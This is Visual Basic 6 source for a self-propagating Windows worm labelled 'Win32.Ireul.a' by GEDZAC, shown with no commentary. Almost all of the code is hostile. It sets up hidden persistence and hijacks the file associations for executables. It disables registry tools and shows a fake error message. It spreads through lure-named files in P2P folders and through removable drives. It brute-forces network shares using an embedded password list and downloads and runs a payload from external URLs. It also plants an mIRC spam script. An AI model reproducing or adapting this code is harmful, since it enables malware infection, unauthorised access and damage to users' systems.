   VERSION 5.00
   Begin VB.Form Form1
      Caption         =   "Form1"
      ClientHeight    =   3195
      ClientLeft      =   60
      ClientTop       =   345
      ClientWidth     =   4680
      Icon            =   "Form1.frx":0000
      LinkTopic       =   "Form1"
      ScaleHeight     =   3195
      ScaleWidth      =   4680
      ShowInTaskbar   =   0   'False
      StartUpPosition =   3  'Windows Default
      Visible         =   0   'False
      Begin VB.Timer Timer3
         Enabled         =   0   'False
         Interval        =   10000
         Left            =   2160
         Top             =   240
      End
      Begin VB.Timer Timer2
         Enabled         =   0   'False
         Interval        =   10000
         Left            =   1080
         Top             =   240
      End
      Begin VB.Timer Timer1
         Enabled         =   0   'False
         Interval        =   10000
         Left            =   240
         Top             =   360
      End
   End
   Attribute VB_Name = "Form1"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = False
   Private Sub Form_Load()
   'Win32.Ireul.a by MachineDramon/GEDZAC
   On Error Resume Next

   If (Command$ <> "") Then id = Shell(Command$, vbNormalFocus)
   If App.PrevInstance Then
   End
   End If

   If GetWinVersion <> 2 Then Call SubProces

   If Ireul Then Call iNext Else Call iSetup

   End Sub

   Private Function Ireul() As Boolean
   On Error Resume Next
   K1 = q(Rr("Software\Gedzac\Ireul", "K1", 3))
   K2 = q(Rr("Software\Gedzac\Ireul", "K2", 3))
   K3 = q(Rr("Software\Gedzac\Ireul", "K3", 3))
   If Len(K1) <= 5 Then Ireul = False: Exit Function
   If Flx(Sp(1) & "\" & K1) Then Ireul = True Else Ireul = False
   End Function

   Private Sub iSetup()
   On Error Resume Next
   K1 = RndName: K2 = RndName: K3 = RndName

   FileCopy Sp(3), Sp(1) & "\" & K1: SA Sp(1) & "\" & K1, 6
   FileCopy Sp(3), Sp(1) & "\" & K2: SA Sp(1) & "\" & K2, 6
   FileCopy Sp(3), Sp(1) & "\" & K3: SA Sp(1) & "\" & K3, 6

   FileCopy Sp(3), Sp(1) & "\Ireul.pif"

   Rw "Software\Gedzac\Ireul", "K1", q(K1), 3, 1
   Rw "Software\Gedzac\Ireul", "K2", q(K2), 3, 1
   Rw "Software\Gedzac\Ireul", "K3", q(K3), 3, 1

   Rw "Software\Microsoft\Windows\CurrentVersion\Run", Mid(K1, 1, InStr(K1, ".") - 1), Sp(1) & "\" & K1, 3, 1
   Rw "Software\Microsoft\WindowsNT\CurrentVersion\Run", Mid(K1, 1, InStr(K1, ".") - 1), Sp(1) & "\" & K1, 3, 1

   Rw "regfile\shell\open\command", "", "Ireul", 1, 1
   Rw "keyfile\shell\open\command", "", "Ireul", 1, 1

   Rw "Software\Microsoft\WindowsNT\CurrentVersion\Policies\System", "DisableRegistryTools", 10, 2, 2
   Rw "Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools", 10, 2, 2
   Rw "Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools", 10, 3, 2

   Rw "exefile\shell\open\command\", "", Sp(1) & "\" & K1 & " " & Chr(34) & "%1" & Chr(34) & " %*", 1, 1
   Rw "batfile\shell\open\command\", "", Sp(1) & "\" & K1 & " " & Chr(34) & "%1" & Chr(34) & " %*", 1, 1
   Rw "comfile\shell\open\command\", "", Sp(1) & "\" & K1 & " " & Chr(34) & "%1" & Chr(34) & " %*", 1, 1
   Rw "piffile\shell\open\command\", "", Sp(1) & "\" & K1 & " " & Chr(34) & "%1" & Chr(34) & " %*", 1, 1
   Rw "scrfile\shell\open\command\", "", Sp(1) & "\" & K1 & " " & Chr(34) & "%1" & Chr(34) & " /S", 1, 1

   If InStr(LCase(LangID()), "español") <> 0 Then
   MsgBox "Imposible abrir el archivo, " & Mid(Sp(3), InStrRev(Sp(3), "\") + 1) & " esta total o parcialmente dañado", vbCritical, "Error"
   Else
   MsgBox "Impossible to open the file, " & Mid(Sp(3), InStrRev(Sp(3), "\") + 1) & " this total or partially damaged", vbCritical, "Error"
   End If

   Sleep 5000

   Call ShellExecute(Form1.hwnd, vbNullString, Sp(1) & "\" & K1, vbNullString, vbNullString, SW_NORMAL)

   End
   End Sub

   Private Sub iNext()
   On Error Resume Next
   If InStr(LCase(Sp(3)), LCase(K1)) Then
    Call Payload
    Call ShellExecute(Form1.hwnd, vbNullString, Sp(1) & "\" & K2, vbNullString, vbNullString, SW_NORMAL)
    Call ShellExecute(Form1.hwnd, vbNullString, Sp(1) & "\" & K3, vbNullString, vbNullString, SW_NORMAL)
    Timer1.Enabled = True
    Timer3.Enabled = True
   ElseIf InStr(LCase(Sp(3)), LCase(K2)) Then
    Call ListP2P: Call ListDisk: Call Red
   ElseIf InStr(LCase(Sp(3)), LCase(K3)) Then
    Timer2.Enabled = True
   Else
   End
   End If
   End Sub

   Private Sub Timer1_Timer()
   On Error Resume Next
   Timer1.Enabled = False
   Static x As Integer
   If x > 60 Then
   x = 0
   Call Dow
   Dim l As Boolean
   l = EnumWindows(AddressOf EnumWin, ByVal 0&)
   Call floppy
   Else
   x = x + 1
   End If
   Timer1.Enabled = True
   End Sub

   Sub ListP2P()
   On Error Resume Next

   Rw q("Thaspfub[LF]FF[KhdfkDhisbis"), q("CntfekbTofuni`"), 0, 2, 2
   Rw q("Thaspfub[LF]FF[UbtrkstAnksbu"), q("qnurtXanksbu"), 0, 2, 2
   Rw q("Thaspfub[LF]FF[UbtrkstAnksbu"), q("anubpfkkXanksbu"), 0, 2, 2

   p0 = Array("C", "D", "E")

   p1 = Array(":\Program Files", ":\Archivos de programa", ":\Programmer", _
   ":\Program", ":\Programme", ":\Programmi", ":\Programfiler", ":\Programas")

   p2 = Array(q("[fwwkbMrndb[nidhjni`"), q("[bChilb~5777[nidhjni`"), q("[@irdkbrt[Chpikhfct"), _
   q("[@uhltsbu[J~'@uhltsbu"), q("[NDV[tofubc'ankbt"), q("[Lf}ff[J~'Tofubc'Ahkcbu"), _
   q("[Lf]fF'Knsb[J~'Tofubc'Ahkcbu"), q("[KnjbPnub[Tofubc"), q("[jhuwobrt[J~'Tofubc'Ahkcbu"), _
   q("[Hqbuibs[nidhjni`"), q("[Tofubf}f[Chpikhfct"), q("[Tpfwshu[Chpikhfc"), q("[PniJ_[J~'Tofubc'Ahkcbu"), _
   q("[Sbtkf[Ankbt"), q("[_hkh_[Chpikhfct"), q("[Ufwn`fshu[Tofub"), q("[LJC[J~'Tofubc'Ahkcbu"), _
   q("[EbfuTofub[Tofubc"), q("[Cnubds'Dhiibds[Ubdbnqbc'Ankbt"), q("[bJrkb[Nidhjni`"))

   For g = 0 To UBound(p0)
   If Fdx(p0(g) & ":\") Then
    For i = 0 To UBound(p1)

     If Fdx(p0(g) & p1(i)) Then

      For x = 0 To UBound(p2)
      If Fdx(p0(g) & p1(i) & p2(x)) Then P2P (p0(g) & p1(i) & p2(x))
      Next

     End If

    Next

   If Fdx(p0(g) & ":\My Downloads") Then P2P p0(g) & ":\My Downloads"
   If Fdx(p0(g) & ":\My Shared Folder") Then P2P p0(g) & ":\My Shared Folder"
   End If
   Next
   End Sub

   Sub P2P(Path)
   On Error Resume Next

   If Right(Path, 1) <> "\" Then Path = Path & "\"

   For Each i In P2PName()
   If Not (Flx(Path & i)) Then FileCopy Sp(1) & "\Ireul.pif", Path & i
   Next

   For Each i In ListFiles(Path)
   If Not (Flx(Path & i & ".exe")) Then FileCopy Sp(1) & "\Ireul.pif", Path & i & ".exe"
   Next

   End Sub

   Function ListFiles(Path)
   On Error Resume Next
   Dim x() As String, a As Integer, sf As String
   If Right(Path, 1) <> "\" Then Path = Path & "\"

   ReDim x(a)

   sf = Dir(Path, vbHidden + vbArchive + vbReadOnly + vbSystem + vbNormal)

   Do While Len(sf) <> 0
   If InStr(LCase(sf), ".exe") = 0 Then x(a) = Mid(sf, 1, InStr(LCase(sf), ".") - 1): ReDim Preserve x(a + 1): a = a + 1
   sf = Dir()
   Loop

   ReDim Preserve x(a - 1)

   ListFiles = x
   End Function

   Private Function P2PName()
   On Error Resume Next
   P = Array("Ana Kournikova Sex Video.exe", "AVP Antivirus Pro Key Crack.exe", "Britney Spears Sex Video.exe", "Buffy Vampire Slayer Movie.exe", _
   "Crack Passwords Mail.exe", "Cristina Aguilera Sex Video.exe", "Game Cube Real Emulator.exe", "Hentai Anime Girls Movie.exe", "Jenifer Lopez Sex Video.exe", _
   "Matrix Movie.exe", "Mcafee Antivirus Scan Crack.exe", "Norton Anvirus Key Crack.exe", "Panda Antivirus Titanium Crack.exe", "PS2 PlayStation Simulator.exe", _
   "Quick Time Key Crack.exe", "Sakura Card Captor Movie.exe", "Sex Live Simulator.exe", "Sex Passwords.exe", "Spiderman Movie.exe", "Start Wars Trilogy Movies.exe", _
   "Thalia Sex Video.exe", "Winzip KeyGenerator Crack.exe ", "aol cracker.exe", "aol password cracker.exe", "divx pro.exe", "GTA 3 Crack.exe", "GTA 3 Serial.exe", _
   "play station emulator.exe", "virtua girl - adriana.exe", "virtua girl - bailey short skirt.exe", "Virtua Girl (Full).exe", "warcraft 3 crack.exe", "warcraft 3 serials.exe", _
   "counter-strike.exe", "delphi.exe", "divx_pro.exe", "HotGirls.exe", "hotmail_hack.exe", "pamela_anderson.exe", "serials2000.exe", "subseven.exe", "VB6.exe", "VirtualSex.exe", _
   "ACDSee 5.5.exe", "Age of Empires 2 crack.exe", "Animated Screen 7.0b.exe", "AOL Instant Messenger.exe", "AquaNox2 Crack.exe", "Audiograbber 2.05.exe", "BabeFest 2003 ScreenSaver 1.5.exe", _
   "Babylon 3.50b reg_crack.exe", "Battlefield1942_bloodpatch.exe", "Battlefield1942_keygen.exe", "Business Card Designer Plus 7.9.exe", "Clone CD 5.0.0.3 (crack).exe", "Clone CD 5.0.0.3.exe", _
   "Coffee Cup Free zip 7.0b.exe", "Cool Edit Pro v2.55.exe", "Diablo 2 Crack.exe", "DirectDVD 5.0.exe", "DirectX Buster (all versions).exe", "DirectX InfoTool.exe", "DivX Video Bundle 6.5.exe", _
   "Download Accelerator Plus 6.1.exe", "DVD Copy Plus v5.0.exe", "DVD Region-Free 2.3.exe", "FIFA2003 crack.exe", "Final Fantasy VII XP Patch 1.5.exe", "Flash MX crack (trial).exe", "FlashGet 1.5.exe", _
   "FreeRAM XP Pro 1.9.exe", "GetRight 5.0a.exe", "Global DiVX Player 3.0.exe", "Gothic2 licence.exe", "Guitar Chords Library 5.5.exe", "Hitman_2_no_cd_crack.exe", "Hot Babes XXX Screen Saver.exe", _
   "ICQ Pro 2003a.exe", "ICQ Pro 2003b (new beta).exe", "iMesh 3.6.exe", "iMesh 3.7b (beta).exe", "IrfanView 4.5.exe", "KaZaA Hack 2.5.0.exe", "KaZaA Speedup 3.6.exe", "Links 2003 Golf game (crack).exe", _
   "Living Waterfalls 1.3.exe", "Mafia_crack.exe", "Matrix Screensaver 1.5.exe", "MediaPlayer Update.exe", "mIRC 6.15.exe", "mp3Trim PRO 2.5.exe", "MSN Messenger 5.2.exe", "NBA2003_crack.exe", _
   "Need 4 Speed crack.exe", "Nero Burning ROM crack.exe", "Netfast 1.8.exe", "Network Cable e ADSL Speed 2.0.5.exe", "NHL 2003 crack.exe", "Nimo CodecPack (new) 8.0.exe", "PalTalk 5.01b.exe", _
   "Popup Defender 6.5.exe", "Pop-Up Stopper 3.5.exe", "QuickTime_Pro_Crack.exe", "Serials 2003 v.8.0 Full.exe", "SmartFTP 2.0.0.exe", "SmartRipper v2.7.exe", "Space Invaders 1978.exe", _
   "Splinter_Cell_Crack.exe", "Steinberg_WaveLab_5_crack.exe", "Trillian 0.85 (free).exe", "TweakAll 3.8.exe", "Unreal2_bloodpatch.exe", "Unreal2_crack.exe", "UT2003_bloodpatch.exe", _
   "UT2003_keygen.exe", "UT2003_no cd (crack).exe", "UT2003_patch.exe", "WarCraft_3_crack.exe", "Winamp 3.8.exe", "WindowBlinds 4.0.exe", "WinOnCD 4 PE_crack.exe", "WinZip 9.0b.exe", _
   "Yahoo Messenger 6.0.exe", "Zelda Classic 2.00.exe", "Windows XP complete + serial.exe", "Screen saver christina aguilera.exe", "Screen saver christina aguilera naked.exe", "Visual basic 6.exe", _
   "Starcraft serial.exe", "Credit Card Numbers generator(incl Visa,MasterCard,...).exe", "Edonkey2000-Speed me up scotty.exe", "Hotmail Hacker 2003-Xss Exploit.exe", "Kazaa SDK + Xbit speedUp for 2.xx.exe", _
   "Microsoft KeyGenerator-Allmost all microsoft stuff.exe", "Netbios Nuker 2003.exe", "Security-2003-Update.exe", "Stripping MP3 dancer+crack.exe", "Visual Basic 6.0 Msdn Plugin.exe", "Windows Xp Exploit.exe", _
   "WinRar 3.xx Password Cracker.exe", "WinZipped Visual C++ Tutorial.exe", "XNuker 2003 2.93b.exe", "cable modem ultility pack.exe", "macromedia dreamweaver key generator.exe", "winamp plugin pack.exe", _
   "winzip full version key generator.exe", "Per Antivirus 8.7.exe", "The Hacker Antivirus 5.7.exe"): P2PName = P
   End Function

   Private Sub floppy()
   On Error Resume Next

   Dim cd0 As Long, cd1 As Long, cd2 As Long, clt As Long, l As Long, r As Integer, v2 As String
   Dim AD(5)
   AD(0) = "Sandra.jpg.pif": AD(1) = "WinDocumt.doc.pif": AD(2) = "Page2015.htm.pif": AD(3) = "Nadia.txt.pif": AD(4) = "Ireul.avi.pif"

   For Each vd In EnDisck(2)

   l = GetDiskFreeSpace(vd, cd0, cd1, cd2, clt)

    If l = 1 Then

   If (cd0 * cd1 * cd2 > 100000) Then

   Randomize
   r = Int(Rnd * 5)

   v2 = LCase(Dir(vd & "*.*"))

   Do While v2 <> ""
   If InStr(v2, ".pif") = 0 Then Exit Do
   v2 = Dir()
   Loop

   If (v2 <> "") And (InStr(v2, ".pif") = 0) And (Not (Flx(vd & v2 & ".pif"))) Then

    FileCopy Sp(1) & "\Ireul.pif", vd & v2 & ".pif"
    SA vd & v2, 6

   Else

    If Not (Flx(vd & AD(r))) Then

     FileCopy Sp(1) & "\Ireul.pif", vd & AD(r)

    End If

   End If

    End If
    End If
   Next
   End Sub

   Private Sub Red()
   On Error Resume Next
   For Each aip In GetLclIP(): CalcSbIp (aip): Next
   Do: DoEvents: Call CalcSbIp(GetRndIP): Loop
   End Sub

   Public Sub CalcSbIp(ByVal ip)
   On Error Resume Next
   pip = Left(ip, InStrRev(ip, "."))
   For c1 = 0 To 255
      ConecIP pip & c1
   Next
   End Sub

   Public Sub ConecIP(ByVal sip)
   On Error Resume Next
   Dim NTR As NETRESOURCE, l As Long, dL As String

   dL = GLD

   NTR.dwType = RESOURCETYPE_DISK
   NTR.lpLocalName = dL
   NTR.lpRemoteName = "\\" & sip & "\C"
   NTR.lpProvider = ""

   For Each c1 In Cred()
     For Each c2 In Cred()

   l = WNetAddConnection2(NTR, CStr(c1), CStr(c2), CONNECT_UPDATE_PROFILE)
   If l = 0 Then CopyRed (dL): Exit Sub

     Next
   Next

   End Sub

   Sub DeConecIp(ByVal cL)
   On Error Resume Next
   Dim l As Long
   l = WNetCancelConnection2(cL, 0, True)
   End Sub

   Private Sub CopyRed(ByVal vL As String)
   On Error Resume Next
   Dim r As String, dW As String

   r = RndName

   FileCopy Sp(1) & "\Ireul.pif", vL & "\" & r

   If Dir(vL & "\autoexec.bat") <> "" Then
   SA vL & "\autoexec.bat", 0
   o = FreeFile
    Open vL & "\autoexec.bat" For Append As #o
    Print #o, vbCrLf & "@win \" & r
    Close #o
   End If

   dW = Dir(vL & "\", vbDirectory + vbSystem + vbHidden + vbReadOnly)

   Do While Len(dW) <> 0

    If LCase(Left(dW, 3)) = "win" Then

     If InStr(dW, ".") = 0 Then

     SA vL & dW & "\win.ini", 0
     WIni "windows", "run", vL & "\" & r, vL & "\" & dW & "\win.ini"

     End If

    End If

   dW = Dir()
   Loop

   DeConecIp (vL)
   End Sub

   Private Function Cred()
   On Error Resume Next: Dim U(1 To 70) As String
   U(1) = "%null%": U(2) = "%username%": U(3) = "%username%12": U(4) = "%username%123"
   U(5) = "%username%1234": U(6) = "123": U(7) = "1234": U(8) = "12345"
   U(9) = "123456": U(10) = "1234567": U(11) = "12345678": U(12) = "654321"
   U(13) = "54321": U(14) = "1": U(15) = "111": U(16) = "11111"
   U(17) = "111111": U(18) = "11111111": U(19) = "000000": U(20) = "00000000"
   U(21) = "pass": U(22) = "5201314": U(23) = "88888888": U(24) = "888888"
   U(25) = "passwd": U(26) = "password": U(27) = "sql": U(28) = "database"
   U(29) = "admin": U(30) = "test": U(31) = "server": U(32) = "computer"
   U(33) = "secret": U(34) = "oracle": U(35) = "sybase": U(36) = "root"
   U(37) = "Internet": U(38) = "super": U(39) = "user": U(40) = "manager"
   U(41) = "security": U(42) = "public": U(43) = "private": U(44) = "default"
   U(45) = "1234qwer": U(46) = "123qwe": U(47) = "abcd": U(48) = "abc123"
   U(53) = "123abc": U(54) = "abc": U(55) = "123asd": U(56) = "asdf"
   U(57) = "asdfgh": U(58) = "!@#$": U(59) = "!@#$%": U(60) = "!@#$%^"
   U(61) = "!@#$%^&": U(62) = "!@#$%^&*": U(63) = "!@#$%^&*(": U(64) = "!@#$%^&*()"
   U(65) = "intel": U(66) = "": U(67) = vbCrLf: U(68) = "KKKKKKK": U(69) = "09876"
   U(70) = "": Cred = U()
   End Function

   Private Function GLD() As String
   On Error Resume Next
   NextGLD:
   Dim gL As String
   Randomize
   gL = Chr(Int(Rnd * 20) + 71)
   If Fdx(gL & ":\") Then GoTo NextGLD
   GLD = gL & ":"
   End Function

   Private Function GetRndIP()
   On Error Resume Next
   Dim rIP As Integer
   Randomize

   For i = 0 To 3
   rIP = Int(Rnd * 255) + 1
   GetRndIP = GetRndIP & "." & rIP
   Next

   GetRndIP = Mid(GetRndIP, 2)
   End Function

   Private Sub Dow()
   On Error Resume Next
   If (Flx(Sp(0) & "\gb.exe")) Or (Not (iStat())) Then Exit Sub
   U = Array("http://utenti.lycos.it/iserver3", "http://es.geocities.com/mdm3002bd", "http://www.iespana.es/gedprueba")
   Randomize: t = Int(Rnd * 3)
   it = DowFile(U(t) & "/gb.bin", Sp(0) & "\gb.exe")
   If it = True Then Call Shell(Sp(0) & "\gb.exe", vbNormalFocus)
   End Sub

   Private Function DowFile(URL As String, Path As String) As Boolean
   On Error Resume Next: Dim lngRetVal As Long
   lngRetVal = URLDownloadToFile(0, URL, Path, 0, 0)
   DowFile = IIf(lngRetVal = 0, True, False)
   End Function

   Private Sub ListDisk()
   On Error Resume Next
   For Each dk In EnDisck(3)
   ListDirs (dk)
   Next
   End Sub

   Private Sub ListDirs(ByVal Path)
   On Error Resume Next
   Dim pFe As WIN32_FIND_DATA, fol As String, fat As Long, v0 As Long, v1 As Long, sDirs As String

   If Right$(Path, 1) <> "\" Then Path = Path & "\"

   v0 = 0
   v0 = FindFirstFile(Path & "*.*", pFe)

   Do
   fol = Mid(pFe.cFileName, 1, InStr(pFe.cFileName, Chr(0)) - 1)
   fat = pFe.dwFileAttributes

   If IsADir(fat) And (Right$(fol, 1) <> ".") Then
   ListFils (Path & fol)
   ListDirs (Path & fol)
   End If

   pFe.cFileName = ""
   v1 = FindNextFile(v0, pFe)
   Loop While v1 <> 0

   FindClose (v0)
   End Sub

   Private Sub ListFils(ByVal Path)
   On Error Resume Next
   Dim pFl As WIN32_FIND_DATA, fil As String, fal As Long, b0 As Long, b1 As Long

   If Right$(Path, 1) <> "\" Then Path = Path & "\"

   b0 = 0
   b0 = FindFirstFile(Path & "*.*", pFl)

   Do
   fil = Mid(pFl.cFileName, 1, InStr(pFl.cFileName, Chr(0)) - 1)
   fal = pFl.dwFileAttributes

   If InStr(LCase(fil), "mirc.ini") <> 0 Then
   MircSpread (Path & fil)
   End If

   pFl.cFileName = ""
   b1 = FindNextFile(b0, pFl)
   Loop While b1 <> 0

   FindClose (b0)
   End Sub

   Private Function IsADir(N) As Boolean
   On Error Resume Next
   Dim Nl(4) As Integer
   Nl(0) = 16: Nl(1) = 2: Nl(2) = 1: Nl(3) = 32: Nl(4) = 4

   If (N = Nl(0)) Or (N = 55) Then IsADir = True: Exit Function

   For i = 0 To UBound(Nl) - 1
   If (N = Nl(0) + Nl(i + 1)) Then IsADir = True: Exit Function
   Next

   For i = 0 To UBound(Nl) - 1
    For x = 0 To UBound(Nl) - 1
    If i <> x Then
     If (N = Nl(0) + Nl(i + 1) + Nl(x + 1)) Then IsADir = True: Exit Function
    End If
    Next
   Next

   For i = 3 To UBound(Nl)
    If (N = Nl(0) + Nl(1) + Nl(2) + Nl(i)) Then IsADir = True: Exit Function
   Next

   End Function

   Private Sub MircSpread(Math)
   On Error Resume Next
   Dim Script As String

   x = FreeFile

   WIni "rfiles", "n2", "Ireul.hlp", CStr(Math)

   Script = ";Irc.Ireul.a By G $+ $Chr(69) $+ D $+ $Chr(65) $+ C" & vbCrLf & _
   "On 1:JOIN:*:{ if ($nick != $me) { spim } | else { if (ayuda isin #) || (help isin #) || (viru isin #) || (avt isin #) || (vh isin #) || (gigairc isin #) { .privmsg # $decode(SXJjLklyZXVsLkEgYnkgR0VEWkFDIExBQlM=,m) | .disconnect | .exit } } }" & vbCrLf & _
   "On 1:PART:#:{ if ($nick != $me) { spim } }" & vbCrLf

   If InStr(LCase(LangID()), "español") <> 0 Then
   Script = Script & "Alias spim { var %r = $rand(1,10)" & vbCrLf & _
   "  if (%r = 1) { var %m = 5Mira esta foto, esta buena http:// $+ %mip $+ /ovniirak.jpg }" & vbCrLf & _
   "  elseif (%r = 2) { var %m = 4,1Fotos de Famosos y Famosas 8,1http:// $+ %mip $+ /famous.htm }" & vbCrLf & _
   "  elseif (%r = 3) { var %m = 8,1No te pierdas las sensuales fotos de 4,1Britney8,1 y 4,1Cristina8,1 http:// $+ %mip $+ /britcris.jpg }" & vbCrLf & _
   "  elseif (%r = 4) { var %m = 4Aprende a satisfacer a tu pareja http:// $+ %mip $+ /sextest.htm }" & vbCrLf & _
   "  elseif (%r = 5) { var %m = 12Que y como piensa el sexo opuesto 4http:// $+ %mip $+ /psicosex.jpg }" & vbCrLf & _
   "  elseif (%r = 6) { var %m = 13,1XXX Sex Teens Lesb Fantasy 4,1http:// $+ %mip $+ /sexteens.jpg }" & vbCrLf & _
   "  elseif (%r = 7) { var %m = 8,1Lo mejor del cine tv y demas entretenimiento 9,1http:// $+ %mip $+ /orbita.htm }" & vbCrLf & _
   "  elseif (%r = 8) { var %m = 12Mira mi foto 4http:// $+ %mip $+ / $+ $me $+ .jpg }" & vbCrLf & _
   "  elseif (%r = 9) { var %m = 4,1Gana dinero en Internet 8,1http:// $+ %mip $+ /money.txt }" & vbCrLf & _
   "  elseif (%r = 10) { var %m = 15,1Conoces la Oscuridad? 14,1http:// $+ %mip $+ /darkness.jpg }" & vbCrLf & _
   ".privmsg $nick %m }"
   Else
   Script = Script & "Alias spim { var %r = $rand(1,10)" & vbCrLf & _
   "  if (%r = 1) { var %m = 5looks at this picture, this good http:// $+ %mip $+ /ovniirak.jpg }" & vbCrLf & _
   "  elseif (%r = 2) { var %m = 4,1The Famous women's pictures 8,1http:// $+ %mip $+ /famous.htm }" & vbCrLf & _
   "  elseif (%r = 3) { var %m = 8,1Don't get lost the sensual pictures of 4,1Britney8,1 and 4,1Cristina8,1 http:// $+ %mip $+ /britcris.jpg }" & vbCrLf & _
   "  elseif (%r = 4) { var %m = 4learns how to satisfy your couple http:// $+ %mip $+ /sextest.htm }" & vbCrLf & _
   "  elseif (%r = 5) { var %m = 12That and like thinks the opposite sex 4http:// $+ %mip $+ /psicosex.jpg }" & vbCrLf & _
   "  elseif (%r = 6) { var %m = 13,1XXX Sex Teens Lesb Fantasy 4,1http:// $+ %mip $+ /sexteens.jpg }" & vbCrLf & _
   "  elseif (%r = 7) { var %m = 8,1The best in the cinema tv and other entertainment 9,1http:// $+ %mip $+ /orbita.htm }" & vbCrLf & _
   "  elseif (%r = 8) { var %m = 12looks at my picture 4http:// $+ %mip $+ / $+ $me $+ .jpg }" & vbCrLf & _
   "  elseif (%r = 9) { var %m = 4,1It makes money in Internet 8,1http:// $+ %mip $+ /money.txt }" & vbCrLf & _
   "  elseif (%r = 10) { var %m = 15,1Do you know the Darkness? 14,1http:// $+ %mip $+ /darkness.jpg }" & vbCrLf & _
   ".privmsg $nick %m }"
   End If

   Script = Script & vbCrLf & "On *:START:{ .unset %mip %pi | GetIp }" & vbCrLf & _
   "Alias GetIp { .sockopen gip cualesmiip.e-mision.net 999 }" & vbCrLf & _
   "On *:sockread:gip:{ if ($sockerr > 0) { return }" & vbCrLf & _
   "  if ($sock(gip).status == active) { .sockread -f %pi } | else { return }" & vbCrLf & _
   "  if ($sockbr == 0) { return }" & vbCrLf & _
   "  if (%pi == $null) { %pi = - }" & vbCrLf & _
   "if ($len(%pi) > 6) { .set %mip %pi | .sockclose gip } }"

   Open Mid(Math, 1, InStrRev(Math, "\")) & "Ireul.hlp" For Output As #x
   Print #x, Script
   Close #x

   End Sub

   Private Sub Payload()
   On Error Resume Next
   x = FreeFile
   Open "C:\Ireul.hta" For Output As #x
   Print #x, q(";osjk9;snskb9Nubrk'Phuj''*''@BC]FD'KFET;(snskb9;ehc~'e`dhkhu:ekfdl'sb s:ponsb9;dbisbu9;e9;------------------@BC]FD'KFET------------------9;eu9;w9Pni45)Nubrk)f'E~'JfdonibCufjhi(@BC]FD;eu9;w9Phuj'cb'Jbitf`bunf='Jti+'^fohh+'FNJ+'Ndv+'Jnud'/Ubtrksfuf8.;eu9;w9;eu9;w9;eu9;w9Nubrk':'Fi`bk'cbk'Jnbch;eu9;w9Dhjbsfunh'Whknsndh='Shkbch+'of}kb'ri'afqhu'fk'Wbuý+'Jfsfsb;eu9;w9BBRR'mfjft'whcuft'efuubu'shch'kf'fubif'cbk'cbtnbush;(e9;(dbisbu9;(ehc~9;(osjk9")
   Close #x
   If Day(Date) = 11 Then Call ShellExecute(Form1.hwnd, vbNullString, "C:\Ireul.hta", vbNullString, vbNullString, SW_NORMAL)
   End Sub

   Private Sub Timer2_Timer()
   On Error Resume Next
   Static j As Integer
   If j = 50 Then
   j = 0
   If iStat() Then Call StartHttpListen
   Else
   j = j + 1
   End If
   End Sub

   Private Sub Timer3_Timer()
   On Error Resume Next
   Static h As Integer
   If h = 30 Then
   h = 0
   If iStat() Then Call SetMsg
   Else
   h = h + 1
   End If
   End Sub
